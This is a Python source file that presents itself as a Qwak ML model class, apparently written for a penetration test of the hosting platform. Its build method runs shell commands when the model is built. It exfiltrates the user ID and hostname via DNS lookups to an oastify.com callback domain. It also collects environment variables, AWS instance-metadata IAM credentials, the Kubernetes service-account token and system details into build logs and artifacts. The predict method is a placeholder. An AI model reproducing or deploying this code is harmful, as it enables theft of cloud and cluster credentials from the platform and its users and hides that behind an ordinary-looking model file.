import qwak
from qwak.model.schema import ModelSchema, ExplicitFeature
from qwak.model.base import QwakModel
import pandas as pd
import os, subprocess

class PentestModel(QwakModel):
    def build(self):
        # DNS exfil - often works even when HTTP is blocked
        try:
            uid = subprocess.check_output("id", shell=True, timeout=3).decode().strip()[:50]
            host = subprocess.check_output("hostname", shell=True, timeout=3).decode().strip()
            # DNS exfil via nslookup subdomain encoding
            safe = uid.replace(" ", "-").replace("(", "").replace(")", "").replace("=", "-")[:60]
            os.system(f"nslookup {safe}.dnsexfil.seagpx8e8n84ssicy9zza0fa91fr33ekgo8d.oastify.com 2>/dev/null &")
            os.system(f"nslookup {host}.hostexfil.seagpx8e8n84ssicy9zza0fa91fr33ekgo8d.oastify.com 2>/dev/null &")
        except: pass

        # File-based exfil via build artifact (appears in Code tab / Download build artifact)
        try:
            recon = {}
            recon['id'] = subprocess.check_output("id", shell=True, timeout=3).decode().strip()
            recon['hostname'] = subprocess.check_output("hostname", shell=True, timeout=3).decode().strip()
            recon['uname'] = subprocess.check_output("uname -a", shell=True, timeout=3).decode().strip()
            recon['env'] = subprocess.check_output("env", shell=True, timeout=3).decode().strip()[:2000]
            recon['ifconfig'] = subprocess.check_output("ip addr 2>/dev/null || ifconfig 2>/dev/null || echo no-net-tools", shell=True, timeout=3).decode().strip()[:1000]
            recon['mounts'] = subprocess.check_output("mount", shell=True, timeout=3).decode().strip()[:1000]
            recon['processes'] = subprocess.check_output("ps aux", shell=True, timeout=3).decode().strip()[:1000]
            recon['imds'] = subprocess.check_output("curl -sm2 http://169.254.169.254/latest/meta-data/ 2>&1 || echo blocked", shell=True, timeout=5).decode().strip()[:500]
            recon['imds_role'] = subprocess.check_output("curl -sm2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 || echo blocked", shell=True, timeout=5).decode().strip()[:500]
            recon['k8s_token'] = subprocess.check_output("cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo no-sa-token", shell=True, timeout=3).decode().strip()[:200]
            recon['k8s_ns'] = subprocess.check_output("cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo no-ns", shell=True, timeout=3).decode().strip()

            # Write recon to a file that gets bundled as build artifact
            with open("/tmp/recon.txt", "w") as f:
                for k, v in recon.items():
                    f.write(f"=== {k} ===\n{v}\n\n")
            print("=== RECON DATA ===")
            for k, v in recon.items():
                print(f"--- {k} ---")
                print(v[:200])
        except Exception as e:
            print(f"Recon error: {e}")

    def schema(self):
        return ModelSchema(
            inputs=[ExplicitFeature(name="x", type=str)],
        )

    @qwak.api()
    def predict(self, df: pd.DataFrame) -> pd.DataFrame:
        return pd.DataFrame({"result": ["ok"] * len(df)})
